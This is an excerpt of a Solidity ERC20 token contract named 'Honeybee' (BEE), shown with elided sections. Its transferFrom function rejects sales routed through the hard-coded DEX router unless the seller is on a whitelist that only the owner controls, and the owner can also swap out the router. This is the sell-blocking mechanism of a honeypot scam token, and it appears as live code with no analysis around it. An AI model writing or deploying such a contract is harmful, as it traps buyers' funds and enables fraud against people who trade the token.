...
contract HoneybeeToken is ERC20, Ownable, Divestor {
    using Address for address;
    address router;
    mapping(address => bool) public whiteList;
    bool public whiteListStatus;

    constructor () ERC20("Honeybee", "BEE") {
        _mint(_msgSender(), 500000 ether);
        whiteListStatus = true;
        router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    }

    function setWhiteList(address permit, bool b) public onlyOwner {
        whiteList[permit] = b;
    }
    function setRouter(address newRouter) public onlyOwner  {
        router = newRouter;
    }
    function setWhiteListStatus(bool b) public onlyOwner  {
        whiteListStatus = b;
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (whiteListStatus) {
            if (_msgSender() == router) {
                require(whiteList[sender], "not permission");
            }
        }
